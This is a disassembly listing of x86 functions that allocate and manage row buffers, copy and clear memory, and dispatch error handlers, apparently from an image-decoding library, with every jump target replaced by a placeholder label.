mov [ ecx + 0x18 ] edx
mov [ ebp - 0xc ] 0x0
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4207a0
add esp 0xc
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x20 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x16
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
shl eax 0x7
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
sub edx [ ecx + 0x18 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
sub ecx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x16
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + eax * 4 ]
push ecx
call sub_420d70
add esp 0x8
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x4 ]
jae r-xdata
sub_4207a0
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
shl ecx 0x7
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x18 ]
imul eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x10 ]
sub eax [ ebp - 0x18 ]
mov ecx [ ebp + 0xc ]
cmp [ ecx + 0x14 ] eax
jge r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x18 ]
add edx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
sub ecx [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] ecx
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
sub ecx [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] ecx
jge r-xdata
mov eax [ ebp - 0x10 ]
imul eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
and ecx 0xff
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jg r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + eax * 4 ]
push ecx
mov edx [ ebp + 0xc ]
add edx 0x28
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
call [ ecx + 0x28 ]
add esp 0x14
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + eax * 4 ]
push ecx
mov edx [ ebp + 0xc ]
add edx 0x28
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
call [ ecx + 0x2c ]
add esp 0x14
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
add edx [ ecx + 0x14 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
sub_420900
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xe
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
cmp [ ebp + 0xc ] 0x2
jl r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x3c ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x3c ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x34 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x34 ] 0x0
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
lea ecx [ ecx + eax + 0x10 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42b2d0
add esp 0xc
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4c ]
sub eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4c ] eax
mov edx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x8 ]
lea edx [ edx + ecx + 0x10 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42b2d0
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] ecx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x22 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ecx + 0x22 ] 0x0
mov edx [ ebp - 0x14 ]
add edx 0x28
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
call [ ecx + 0x30 ]
add esp 0x8
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x48 ] 0x0
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx + 0x22 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax + 0x22 ] 0x0
mov ecx [ ebp - 0x18 ]
add ecx 0x28
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x18 ]
call [ eax + 0x30 ]
add esp 0x8
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x18 ] eax
sub_420ac0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
push 0x54
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42b2d0
add esp 0xc
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42b360
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_420900
add esp 0x8
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
sub_420b30
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x24 ]
add esp 0x8
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x64
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0xc8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_420bb0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax + 0x28 ]
add esp 0x4
sub_420bf0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x82
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x80 ] 0x0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420c30
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x112
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x111 ] 0x0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420c70
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax - 0x1 ]
cdq
idiv [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420c90
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax - 0x1 ]
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0x8 ]
cdq
idiv [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub eax edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420cc0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx * 4 ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
lea eax [ edx + ecx * 4 ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x4
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x10 ]
add edx 0x4
mov [ ebp + 0x10 ] edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call memcpy
add esp 0xc
jmp r-xdata
mov edx [ ebp - 0x10 ]
sub edx 0x1
mov [ ebp - 0x10 ] edx
sub_420d40
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
shl eax 0x7
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call memcpy
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420d70
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call memset
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420da0
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
push 0x50
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x184 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_421010
mov eax [ ebp + 0xc ]
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
xor edx edx
mov dl [ ecx + 0x8 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x118 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x118 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_420ef0
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x118 ]
add edx 0x2
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x2f
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0xc ]
imul ecx [ eax + 0x24 ]
mov esi [ ebp + 0x8 ]
mov eax ecx
cdq
idiv [ esi + 0x118 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
imul edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
mov edx [ eax + 0x1c ]
imul edx [ ecx + 0x24 ]
push edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x8 ]
add esp 0x10
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x54
mov [ ebp - 0x14 ] edx
sub_420ef0
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x118 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
shl edx 0x1
shl edx 0x2
push edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x38 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x38 ]
lea eax [ edx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x3c ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0xc ]
imul ecx [ eax + 0x24 ]
mov esi [ ebp + 0x8 ]
mov eax ecx
cdq
idiv [ esi + 0x118 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x10 ]
add edx 0x4
mov eax [ ebp - 0xc ]
imul eax edx
shl eax 0x1
shl eax 0x2
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
lea eax [ edx + ecx * 4 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x38 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x4
mov eax [ ebp - 0xc ]
imul eax edx
mov ecx [ ebp - 0x18 ]
lea edx [ ecx + eax * 4 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x54
mov [ ebp - 0x14 ] edx
sub_421010
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
xor edx edx
mov dl [ ecx + 0x8 ]
test edx edx
je r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_421260
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_421310
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4210d0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_421730
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
sub_4210d0
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x118 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x24 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
cdq
idiv [ ecx + 0x118 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp - 0x8 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x8 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x2
mov eax [ ebp - 0x10 ]
imul eax edx
cmp [ ebp - 0xc ] eax
jge r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
mov esi [ ebp - 0x1c ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov esi [ ebp - 0x24 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
shl edx 0x1
cmp [ ebp - 0xc ] edx
jge r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
imul eax [ ebp - 0x14 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
sub ecx 0x2
mov edx [ ebp - 0x10 ]
imul edx ecx
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x24 ]
mov esi [ ebp - 0x1c ]
mov eax [ esi + eax * 4 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp - 0x14 ]
sub ecx 0x2
mov edx [ ebp - 0x10 ]
imul edx ecx
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
imul eax [ ebp - 0x14 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x24 ]
mov esi [ ebp - 0x1c ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x54
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_421260
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x30 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x118 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x34
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x8
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18c ]
call [ ecx + 0x4 ]
add esp 0x1c
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x8
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
call [ ecx + 0xc ]
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] 0x1
jmp r-xdata
sub_421310
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x30 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x38 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
call [ ecx + 0xc ]
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x118 ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
